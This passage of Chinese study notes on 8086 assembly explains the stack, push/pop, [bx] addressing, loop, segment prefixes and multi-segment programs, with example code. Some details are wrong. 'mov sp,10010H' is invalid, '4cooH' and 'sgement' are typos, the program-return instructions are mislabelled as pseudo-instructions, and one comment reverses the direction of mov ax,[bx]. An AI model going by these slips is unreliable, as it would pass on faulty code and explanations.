指向当前栈顶前面的单元，以此为新的栈顶</p><p>​2）将 ax 中的内容送入SS:SP 指向的内存单元处，SS:SP 此时指向新栈顶</p><p><img src="https://img.dkdun.cn/v1/2025/12/7abce8d3ed075e5c.png"></p><p>将 10000H~1000FH 当作栈，SS&#x3D;1000H，栈空间大小为16字节。任意时刻 SS:SP 指向栈顶，当栈中只有一个元素时，SS&#x3D;1000H，SP&#x3D;000EH。栈为空，就相当于栈中唯一的元素出栈，出栈后，SP&#x3D;SP+2，SP 原来为 000EH，后 SP&#x3D;0010H，所以栈为空时，SS&#x3D;1000H,SP&#x3D;10H</p><p><img src="https://img.dkdun.cn/v1/2025/12/2ec88a03c45bf2ad.png"></p><p>当栈为空时，也就不存在栈顶元素。SS:SP就只能指向最底部单元下面的单元，该单元的偏移地址为栈最底部的字单元的偏移地址+2，栈最底部字单元地址为1000:000E,所以栈空时，SP&#x3D;0010H</p><h5 id="pop-ax步骤："><a href="#pop-ax步骤：" class="headerlink" title="pop ax步骤："></a>pop ax步骤：</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">1) 将 SS:SP 指向的内存单元处的数据送入ax中<br>1) SP=SP+2，SS:SP指向当前栈下面单元，以此为栈顶<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/dac4293593baecdf.png"></p><p>出栈后，SS：SP 指向新的栈顶 1000EH，pop 操作前的栈顶元素，1000CH 处的 2266H 依然存在。但已经不在栈中。再次执行 push 等入栈指令后，SS：SP 移至1000CH，并写入新的数据，将被覆盖</p><h2 id="3-8-栈顶超界的问题"><a href="#3-8-栈顶超界的问题" class="headerlink" title="3.8 栈顶超界的问题"></a>3.8 栈顶超界的问题</h2><p>注意入栈出栈时超界问题</p><h2 id="3-9-push、pop指令"><a href="#3-9-push、pop指令" class="headerlink" title="3.9 push、pop指令"></a>3.9 push、pop指令</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">push 寄存器 //将一个寄存器的数据入栈<br>pop  寄存器//用一个寄存器接收出栈的数据<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">push 段寄存器//将一个段寄存器中的数据入栈<br>pop 段寄存器//用段寄存器接收数据<br>push 内存单元//将一个内存单元处的字入栈<br>pop 内存单元 //用一个内存单元接收数据<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs assembly">e.g.<br>mov ax,1000H<br>mov ds,ax<br>push [0]//将1000:0处的字压入栈中<br>pop [2]//出栈的数据放入1000:2处<br></code></pre></td></tr></table></figure><p>指令执行时，CPU 要知道内存单元的地址，可以在 push、pop 指令中给出内存单元的偏移地址，段指令在执行时，CPU 从 ds 中获得</p><p>e.g</p><ol><li>将 10000H~1000FH 这段空间当作栈，初始状态栈为空，将 AX，BX，DX 中的数据入栈</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov ax,1000H<br>mov ss,ax//设置栈的段地址，SS=1000H,不能直接向段寄存器SS中送入数据，所以用ax中转<br>mov sp,0010H//设置栈顶的偏移地址，栈为空，所以sp=0010H<br>push ax<br>push bx<br>push dx<br></code></pre></td></tr></table></figure><ol start="2"><li><p>将 10000H~1000FH 这段空间当作栈，初始状态是空的，AX&#x3D;001AH，BH&#x3D;001BH，将 AX，BX 的数据入栈，然后将 AX、BX 清零，从栈中恢复 AX、BX 原来的内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov ax,1000H<br>mov ss,ax<br>mov sp,0010H//初始化栈<br><br>mov ax,001AH<br>mov bx,001BH<br><br>push ax<br>push bx//ax,bx入栈<br><br>sub ax,ax//ax清零，也可以用mov ax,0<br>sub bx,bx<br><br>pop bx//恢复数据，当前栈顶为bx中的内容001BH，ax的001AH在栈顶下面，所以先pop bx 再pop ax<br>pop ax<br></code></pre></td></tr></table></figure></li></ol><h2 id="3-10-栈段"><a href="#3-10-栈段" class="headerlink" title="3.10 栈段"></a>3.10 栈段</h2><p>一段内存当作栈，所以为栈段</p><ol><li><p>将 10000H~1000FH 中的八个字，逆序复制到 20000H-2000FH 中</p></li><li><p><img src="https://img.dkdun.cn/v1/2025/12/94ec61152f16187c.png"></p></li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov ax,1000H<br>mov ds,ax<br>mov ax,2000H<br>mov ss,ax<br>mov sp,10010H<br>push [0]<br>push [2]<br>push [4]<br>push [6]<br>push [8]<br>push [A]<br>push [C]<br>push [E]<br></code></pre></td></tr></table></figure><p>将 10000H~1000FH 中的八个字，逆序复制到 20000H-2000FH 中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov ax,2000H<br>mov ds,ax<br>mov ax,1000H<br>mov ss,ax<br>mov sp,0<br>pop [E]<br>pop [C]<br>pop [A]<br>pop [8]<br>pop [6]<br>pop [4]<br>pop [2]<br>pop [0]<br></code></pre></td></tr></table></figure><h1 id="四、第一个程序"><a href="#四、第一个程序" class="headerlink" title="四、第一个程序"></a>四、第一个程序</h1><h2 id="4-2-源程序"><a href="#4-2-源程序" class="headerlink" title="4.2 源程序"></a>4.2 源程序</h2><h3 id="1-伪指令"><a href="#1-伪指令" class="headerlink" title="1. 伪指令"></a>1. 伪指令</h3><p><strong>汇编语言中有汇编指令和伪指令。</strong></p><ul><li>汇编指令：有对应的机器码指令，可以被编译为机器指令，最终被 CPU 所执行。</li><li>伪指令：没有对应的机器指令，不被 CPU 执行。由编译器执行指令，进行相关编译工作。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs assembly">assume cs:codesg//将代码段codesg和CPU的段寄存器cs联系<br>codesg segment//定义一个段，段名为codesg<br>mov ax,0123H<br>mov bx,0456H<br>add ax,bx<br>add ax,ax<br>mov ax,4c00H<br>int 21H<br>codesg ends//段结束<br>end//程序结束<br></code></pre></td></tr></table></figure><p>a. segment 和 ends 是成对使用的伪指令，segment 和 ends 定义一个段，格式为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">段名 segment<br>:<br>段名 ends<br></code></pre></td></tr></table></figure><p>b. end 表示一个汇编程序结束</p><p>c. assume 说明某段寄存器和程序中的某一个用 segment…ends 定义的段相联</p><h3 id="2-源程序中的程序"><a href="#2-源程序中的程序" class="headerlink" title="2. 源程序中的程序"></a>2. 源程序中的程序</h3><h3 id="3-标号"><a href="#3-标号" class="headerlink" title="3. 标号"></a>3. 标号</h3><p>如“codesg”，一个标号代表了一个地址，codesg 在 segment 前面，作为一个段名称，这个名称最终被编译、连接程序处理为一个段的段地址。</p><h3 id="4-程序的结构"><a href="#4-程序的结构" class="headerlink" title="4. 程序的结构"></a>4. 程序的结构</h3><p>编写运算2^3。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs assembly">assume cs:abc//将abc和cs联系起来<br>abc segment//定义一个程序段<br>mov ax,2<br>add ax,ax<br>add ax,ax<br>abc ends<br>end//程序结束<br></code></pre></td></tr></table></figure><h3 id="5-程序的返回"><a href="#5-程序的返回" class="headerlink" title="5. 程序的返回"></a>5. 程序的返回</h3><p>一个程序结束后，将 CPU 的控制权交换给它得以运行的程序，这个过程称为程序返回</p><table><thead><tr><th>目的</th><th>相关指令</th><th>指令性质</th><th>指令执行者</th></tr></thead><tbody><tr><td>通知编译器一个段的结束</td><td>段名 ends</td><td>伪指令</td><td>编译时编译器</td></tr><tr><td>通知编译器程序结束</td><td>end</td><td>伪指令</td><td>编译时由编译器</td></tr><tr><td>程序返回</td><td>mov ax,4cooH  int 21H</td><td>伪指令</td><td>执行时由CPU</td></tr></tbody></table><h2 id="4-3-编辑源程序"><a href="#4-3-编辑源程序" class="headerlink" title="4.3 编辑源程序"></a>4.3 编辑源程序</h2><p>DOS 中有一个程序 command.com，这个程序在 DOS 中称为命令解释器，也就是 DOS 系统的 shell</p><p>汇编程序从写出到执行过程</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">编程 -&gt; 1.asm-&gt; 编译 -&gt; 1.obj -&gt; 连接 -&gt; 1.exe -&gt; 加载 -&gt; 内存中的程序 -&gt; 运行<br>(Edit)   (masm)   (link)  (command) (CPU)<br></code></pre></td></tr></table></figure><h1 id="五、-BX-和-loop-指令"><a href="#五、-BX-和-loop-指令" class="headerlink" title="五、[BX] 和 loop 指令"></a>五、[BX] 和 loop 指令</h1><p>1.[bx] 和 [0] 类似，偏移地址为 0</p><p>2.[bx] 表示一个内存单元，偏移地址在 bx 中</p><p>3.loop 循环</p><p>4.”（）“符号三种类型：**a)**寄存器名</p><p>​**b)**段寄存器名 </p><p>​**c)**内存单元物理地址（一个20位数据）</p><p>e.g</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs assembly">ax内容位0010H，可以描述为：(ax)=0010H<br>2000:1000处的内容为0010H，描述为：(21000H)=0010H<br>mov ax,[2]描述为(ax)=((ds)*16+2)<br>mov [2],ax描述为((ds)*16+2)=ax<br>add ax,2描述为(ax)=(ax)+2<br>add ax,bx描述为(ax)=(ax)+(bx)<br>push ax 描述为 (sp)=(sp)-2((ss)*16+(sp))=(ax)<br>pop ax描述为(ax)=((ss)*16+(sp))(sp)=(sp)+2<br></code></pre></td></tr></table></figure><p>5.”(X)“中表示数据有两种类型：字节和字</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">比如(al)、(bl)、(cl)等得到的数据为字节<br>(ds)、(ax)、(bx)等得到的数据为字<br>(al)=(20000H)，则(20000H)得到的数据为字节型<br>(ax)=(20000H)，则(20000H)得到的为字型<br></code></pre></td></tr></table></figure><p>6.约定符号 idata 表示常量</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov ax,[idata]代表 mov ax,[1]、mov ax,[2]、mov ax,[3]等<br>mov bx,idata代表mov bx,1、mov bx,2、mov bx,3等<br>mov ds,idata代表mov ds,1、mov ds,2等，都是非法指令<br></code></pre></td></tr></table></figure><h3 id="5-1-BX"><a href="#5-1-BX" class="headerlink" title="5.1 [BX]"></a>5.1 [BX]</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov ax,[bx]<br>bx中存放数据作为一个偏移地址EA，段地址SA默认在ds中，将ax中的数据送入内存SA:EA处，即:((ds)*16+(bx))=(ax)<br></code></pre></td></tr></table></figure><p>e.g 写出程序执行后，21000H~21007H 单元中的内容</p><p><img src="https://img.dkdun.cn/v1/2025/12/fc40b0af9b9b9006.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov ax,2000H<br>mov ds,ax<br>mov bx,1000H//ds=2000H,bx=1000H<br><br>mov ax,[bx]//将2000:1000处的字型数据送入ax中。ax=00beH<br><br>inc bx<br>inc bx//bx=1002H<br><br>mov [bx],ax//ds=2000H,bx=1002H,将ax内容送入2000:1002处。2000:1002内容为BE，2000:1003内容为00<br>inc bx<br>inc bx//bx=1004H<br><br>mov [bx],ax//2000:1004内容为BE，2000:1004内容为00<br><br>inc bx//bx=1005H<br><br>mov [bx],al//ds=2000H,bx=1005H,将al中的数据送入2000:1005处。2000:1005单元的内容为BE<br><br>inc bx<br>mov [bx],al//bx=1006H,2000:1006单元的内容为BE<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/13d635b29f0a5e87.png"></p><h3 id="5-2-Loop指令"><a href="#5-2-Loop指令" class="headerlink" title="5.2 Loop指令"></a>5.2 Loop指令</h3><ol><li><p>格式：loop  标号</p></li><li><p>CPU 执行指令时要进行两步操作：a. (cx)&#x3D;(cx)-1  b. 判断 cx 中的值，不为零则转至标号处执行程序，如果为零则向下执行。</p></li></ol><p>e,g 计算2^2，结果存在ax中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs assembly">assume cs:code<br>code sgement<br>mov ax,2<br>add ax,ax<br>mov ax,4c00h<br>int  21h<br>code ends<br>end<br></code></pre></td></tr></table></figure><p>e.g 计算2^12,结果存在 ax 中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs assembly">assume cs:code<br>code segment<br>mov ax,2<br><br>mov cx,11<br>s: add ax,ax//用s标识了一个地址，地址处有一条指令：add ax,ax<br>loop s//判断(cx)=(cx)-1，不为0转到s所标识的地址处执行，如果为0就执行下一条指令，下一条为mov ax,4c00h<br>//执行loop s时，首先将(cx)-1，不为0就转到s处<br><br>mov ax,4c00h<br>int 21h<br>code ends<br>end<br></code></pre></td></tr></table></figure><p>cx 和 loop 指令配合实现循环3要点：</p><p>​1）在 cx 中存放循环次数</p><p>​2）loop 指令中的标号所标识地址要在前面</p><p>​3）要循环执行的程序段，要写在标号和 loop 指令的中间</p><p>框架</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov cx,循环次数<br>s:<br>循环执行的程序段<br>loop s<br></code></pre></td></tr></table></figure><p>e.g 用加法计算123*236,结果存在ax中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs assembly">assume cs:code<br>code segment<br>mov ax,0<br>mov cx,236<br>s:add ax,123<br>loop s<br>mov ax,4c00h<br>int 21h<br>code ends<br>end<br></code></pre></td></tr></table></figure><h3 id="5-5-loop-和-bx-的联合应用"><a href="#5-5-loop-和-bx-的联合应用" class="headerlink" title="5.5 loop 和 [bx] 的联合应用"></a>5.5 loop 和 [bx] 的联合应用</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs assembly">assume cs:code<br>code segment<br>mov ax,0ffffh<br>mov ds,ax<br>mov bx,0//初始化ds:bx指向ffff:0<br><br>mov dx,0//初始化累加寄存器dx,(dx)=0<br><br>mov cx,12//初始化循环计数寄存器cx,(cx)=12<br><br>s:mov al,[bx]<br>mov ah,0<br>add dx,ax//间接向dx中加上((ds)*16+(bx))单元的数值<br>inc bx//ds:bx指向下一个单元<br>loop s<br><br>mov ax,4c00h<br>int 21h<br>code ends<br>end<br></code></pre></td></tr></table></figure><h3 id="5-6-段前缀"><a href="#5-6-段前缀" class="headerlink" title="5.6 段前缀"></a>5.6 段前缀</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov ax,ds:[bx]//将一个内存单元内容送入ax，这个内存单元长度为2字节，存放一个字，偏移地址在bx中，段地址在ds中<br>cs:[bx]<br>ss:[bx]<br>es:[bx]<br>mov ax,ss:[0]//将一个内存单元内容送入ax，这个内存单元长度为2字节，存放一个字，偏移地址为0，段地址在ss中<br>cs:[0]<br></code></pre></td></tr></table></figure><p>段前缀用于显示地指明内存单元的段地址，如”ds”,“cs”,“ss”,“es”等</p><h3 id="5-7-一段安全的空间"><a href="#5-7-一段安全的空间" class="headerlink" title="5.7 一段安全的空间"></a>5.7 一段安全的空间</h3><ul><li>直接向一段内存写入内容</li><li>这段内容不应存放系统或其他程序的数据或代码,否则写入操作可能引发错误</li><li>DOS 方式下，一般情况，0:200~0:2ff 空间中没有系统或其他程序的数据或代码</li><li><strong>要直接向一段内存中写入内容时，使用 0:200~0:2ff 这段空间</strong></li></ul><h3 id="5-8-段前缀的使用"><a href="#5-8-段前缀的使用" class="headerlink" title="5.8 段前缀的使用"></a>5.8 段前缀的使用</h3><p>e.g 将内存 ffff:0~fff:b 单元处的数据复制到 0:200-0:20b 单元中</p><ul><li><p>0:200-0:20b 相当于 0020:0-0020:b 单元</p></li><li><p>初始化：X&#x3D;0  循环12次：将ffff:X单元的数据送入 0020:X     X&#x3D;X+1 </p></li><li><p>源始单元 ffff:X 和目标单元 0020:X 的偏移地址X是变量。用 bx 存放</p></li><li><p>将 0:200-0:20b 用 0020:0-0020:b 描述，使目标单元的偏移地址和源始单元的偏移地址从同一数值 0 开始</p><p><strong>使用两个寄存器分别存放源始单元 ffff:X 和目标单元 0020:X 的段地址</strong></p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs assembly">assume cs:code<br>code segment<br>mov ax,0ffffh<br>mov ds,ax//(ds)=0ffffh<br><br>mov ax,0020h<br>mov es,ax//(es)=0020h<br><br>mov bx,0//(bx)=0,此时ds:bx指向0fffh:0,es:bx指向0020h:0<br><br>mov cx,12//(cx)=12<br><br>s:mov dl,[bx]//(dl)=((ds)*16+(bx)),将ffff:bx中的数据送入dl<br>mov es:[bx],dl//(es)*16+(bx)=(dl),将dl中数据送入0020:bx<br>inc bx//(bx)=(bx)+1<br>loop s<br><br>mov ax,4c00h<br>int 21h<br>code ends<br>end<br></code></pre></td></tr></table></figure><h1 id="六、包含多个段的程序"><a href="#六、包含多个段的程序" class="headerlink" title="六、包含多个段的程序"></a>六、包含多个段的程序</h1><h3 id="6-1-在代码块中使用数据"><a href="#6-1-在代码块中使用数据" class="headerlink" title="6.1 在代码块中使用数据"></a>6.1 在代码块中使用数据</h3><p>框架</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs assembly">assume cs:code<br>code segment<br>:<br>数据<br>:<br>start:<br>:<br>代码<br>:<br>code ends<br>end start<br></code></pre></td></tr></table></figure><p>e.g. 计算以下八个数据的和，结果存在ax寄存器中：0123h、0456h、0789h、0abch、0defh、0fedh、0cbah、0987h</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs assembly">assume cs:code<br>code segment<br>dw 0123h,0456h,0789h,0abch,0defh,0fedh,0cbah,0987h//dw定义字型数据。即“define word”<br>start:mov bx,0<br>mov ax,0<br><br>mov cx,8<br>s:add ax,cs:[bx]<br>add bx,2<br>loop s<br><br>mov ax,4c00h<br>            int 21h<br>code ends<br>end start<br></code></pre></td></tr></table></figure><h3 id="6-2-在代码段中使用栈"><a href="#6-2-在代码段中使用栈" class="headerlink" title="6.2 在代码段中使用栈"></a>6.2 在代码段中使用栈</h3><p>利用栈，将数据0123h、0456h、0789h、0abch、0defh、0fedh、0cbah、0987h逆序存放，数据存放在cs:10-cs:2F单元中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs assembly">assume cs:codesg<br>codesg segment<br>dw 0123h,0456h,0789h,0abch,0defh,0fedh,0cbah,0987h<br>dw 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0//用dw定义16个字型数据，在程序加载后，会取得16个字的内存空间，存放这16个数据。后面程序中将这段空间当作栈来使用<br><br>start:mov ax,cs<br>mov ss,ax<br>mov sp,30h//将设置栈顶ss:sp指向cs:30<br><br>mov bx,0<br>mov cx,8<br>s:push cs:[bx]<br>add bx,2<br>loop s//以上代码0-15单元中的8个字符数据依次入栈<br><br>mov bx,0<br>mov cx,8<br>s0:pop cs:[bx]<br>add bx,2<br>loop s0//依次出栈8个字符型数据到代码段0-15单元中<br><br>mov ax,4c00h<br>int 21h<br>codesg ends<br>end start<br></code></pre></td></tr></table></figure><p>1.e.g 下面的程序依次实现使用内存0:0-0:15单元中的内容改写程序中的数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs assembly">assume cs:codesg<br>codesg segment<br>dw 0123h,0456h,0789h,0abch,0fedh,0cbah,0987h<br>start:mov ax,0<br>mov ds,ax<br>mov bx,0//ds=0,bx=0<br><br>mov cx,8<br>s:mov ax,[bx]//将ds:0数据送入ax<br>mov cs:[bx],ax//(cs)*16+(bx)=(ax),将ax数据送入cs:0处<br>add bx,2//cs:2<br>loop s<br><br>mov ax,4c00h<br>int 21h<br>codesg ends<br>end start<br></code></pre></td></tr></table></figure><p>用栈来进行数据传送</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs assembly">assume cs:codesg<br>codesg segment<br>dw 0123h,0456h,0789h,0abch,0defh,0fedh,0cbah,0987h<br>dw 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0<br>start:mov ax,cs<br>mov ss,ax<br>mov sp,24h<br><br>mov ax,0<br>mov ds,ax<br>mov bx,0<br>mov cx,8<br>s:push [bx]<br>pop cs:[bx]<br>add bx,2<br>loop s<br><br>mov ax,4c00h<br>int 21h<br>codesg ends<br>end start<br></code></pre></td></tr></table></figure><h3 id="6-3-将数据、代码、栈放入不同的段"><a href="#6-3-将数据、代码、栈放入不同的段" class="headerlink" title="6.3 将数据、代码、栈放入不同的段"></a>6.3 将数据、代码、栈放入不同的段</h3><p>逆序存放</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs assembly">assume cs:code,ds:data,ss:stack<br>data segment<br>dw 0123h,0456h,0789h,0abch,0defh,0fedh,0cbah,0987h<br>data ends<br>stack segment<br>dw 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0<br>stack ends<br>code segment<br>start:mov ax,stack<br>mov ss,ax<br>mov sp,20h//设置栈顶ss:sp指向stack:20<br><br>mov ax,data<br>mov ds,ax//ds指向data段<br><br>mov bx,0//ds:bx指向data段中第一个单元<br><br>mov cx,8<br>s:push [bx]<br>add bx,2<br>loop s//将data段中0-15单元中的8个字符型数据依次入栈<br><br>mov bx,0<br><br>mov cx,8<br>s0:pop [bx]<br>add bx,2<br>loop s0//依次出栈到data段的0-15单元中<br><br>mov ax,4c00h<br>int 21h<br>code ends<br>end start<br></code></pre></td></tr></table></figure><h1 id="七、定位内存地址的方法"><a href="#七、定位内存地址的方法" class="headerlink" title="七、定位内存地址的方法"></a>七、定位内存地址的方法</h1><h3 id="7-1-and和or指令"><a href="#7-1-and和or指令" class="headerlink" title="7.1 and和or指令"></a>7.1 and和or指令</h3><p>1）and 指令：逻辑与，按位进行与运算（两个1才是1）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov 